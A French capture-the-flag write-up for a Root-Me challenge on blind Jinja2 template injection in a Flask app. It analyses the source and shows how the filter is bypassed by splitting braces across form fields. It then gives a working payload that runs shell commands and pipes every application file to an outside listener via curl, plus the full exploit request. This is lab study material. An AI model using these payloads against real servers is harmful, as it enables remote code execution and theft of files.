# Python - SSTI contournement de filtres en aveugle — Write-up

**Plateforme :** Root-Me
**Challenge :** Python - SSTI contournement de filtres en aveugle
**Catégorie :** Web Serveur
**Auteur :** Podalirius

## Description

Une application Flask propose un formulaire de candidature (nom, prénom, email, date de naissance). Les champs sont injectés dans un mail via Jinja2 puis renvoyés. Aucun retour n'est affiché à l'utilisateur : l'injection est aveugle. Une blacklist filtre les séquences Jinja et mots-clés sensibles.

Le code source est fourni (`cms.tar.gz` sur la page d'accueil).

## Analyse du code

Fichier `server_ch73.py`, extrait des parties clés :

```python
mail = """
...
 - '{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'
...
"""

def sendmail(address, content):
    try:
        content += "\n\n{{ signature }}"
        _signature = """---\n<b>Offsec Team</b>\noffsecteam@hackorp.com"""
        content = jinja2.Template(content).render(signature=_signature)
    except Exception as e:
        pass
    return None

def sanitize(value):
    blacklist = ['{{','}}','{%','%}','import','eval','builtins','class','[',']']
    for word in blacklist:
        if word in value:
            value = value.replace(word,'')
    if any([bool(w in value) for w in blacklist]):
        value = sanitize(value)
    return value
```

Dans `register()` :

```python
register_mail = jinja2.Template(mail).render(
    hacker_name=sanitize(request.form["name"]),
    hacker_surname=sanitize(request.form["surname"]),
    hacker_email=sanitize(request.form["email"]),
    hacker_bday=sanitize(request.form["bday"])
)
sendmail("offsecteam@hackorp.com", register_mail)
```

Trois points clés :

1. **Double rendu Jinja2.** Le premier `render` (dans `register`) remplace les variables par les valeurs sanitizées : aucune SSTI ici, les valeurs sont traitées comme du texte brut. Mais `sendmail` rappelle `jinja2.Template(content).render(...)` sur le mail déjà composé : **c'est ce second rendu qui parse les tags Jinja injectés**.

2. **Concaténation sans séparateur.** Dans le template mail, la ligne du CSV colle les quatre champs bout-à-bout :
   `'{{ hacker_name }}{{ hacker_surname }}{{ hacker_email }}{{ hacker_bday }}.csv'`
   On peut donc répartir une séquence `{{ ... }}` sur plusieurs champs : chaque champ ne contient qu'un seul `{` ou `}` et passe la blacklist, mais la concaténation finale produit `{{` et `}}`.

3. **Blacklist contournable.** La liste interdit `class`, `eval`, `builtins`, `import`, `[`, `]`. On évite ces tokens avec :
   - `lipsum.__globals__` au lieu de `''.__class__.__mro__[...]` (pas de `class`, pas de `[]`)
   - `.os.popen(...)` au lieu de `['os']` (accès attribut plutôt que clé)

## Construction du payload

Longueurs maximales : `name` <= 20, `surname` < 50, `email` < 50, `bday` <= 10.

Expression finale après concaténation :

```
{{lipsum.__globals__.os.popen('find . -type f | xargs cat|curl -d@- https://z.taild5b46a.ts.net')}}
```

Découpage :

| Champ    | Valeur                                                          |
|----------|-----------------------------------------------------------------|
| name     | `x{`                                                            |
| surname  | `{lipsum.__globals__.os.popen('find . -type f \| xa`            |
| email    | `rgs cat\|curl -d@- https://z.taild5b46a.ts.net')}`             |
| bday     | `}y`                                                            |

Concaténation : `x` + `{` + `{lipsum.__globals__.os.popen('find . -type f | xargs cat|curl -d@- https://z.taild5b46a.ts.net')` + `}` + `}y`

Chaque champ passe la blacklist (un seul `{` ou `}`, pas de mot-clé interdit). Après le premier rendu, le mail contient un bloc `{{ ... }}` complet, que le second rendu exécute.

Notes d'optimisation :

- **`lipsum` au lieu de `cycler.__init__`** : `lipsum` est déjà une fonction, `.__globals__` direct (économie de 9 caractères vs `cycler.__init__.__globals__`).
- **`.read()` omis** : `os.popen()` lance le processus immédiatement. On exfiltre via `curl`, pas besoin de récupérer la sortie.

## Exfiltration

L'injection est aveugle : aucun retour dans la réponse HTTP. Il faut un canal OOB.

Serveur d'écoute via Tailscale Funnel (expose `localhost:3000` en HTTPS publique) :

```bash
python3 -m http.server 3000
tailscale funnel --bg 3000
```

`curl -d@-` lit stdin comme corps POST. `python3 -m http.server` ne log pas le body, donc on utilise `nc -lvnp 3000` ou un petit serveur Flask pour voir le contenu, ou on redirige en GET dans l'URL :

```
popen('curl https://z.taild5b46a.ts.net/$(id|base64 -w0)')
```

## Requête finale

```bash
curl -s -o /dev/null -X POST http://challenge01.root-me.org:59073/ \
    --data-urlencode "name=x{" \
    --data-urlencode "surname={lipsum.__globals__.os.popen('find . -type f | xa" \
    --data-urlencode "email=rgs cat|curl -d@- https://z.taild5b46a.ts.net')}" \
    --data-urlencode "bday=}y"
```

Le serveur challenge exécute alors `find . -type f | xargs cat | curl -d@- https://...` : tous les fichiers du répertoire courant sont concaténés et envoyés en POST vers le listener.

## Flag

Le flag apparaît dans le body POST reçu par le listener, parmi le contenu des fichiers de l'application.
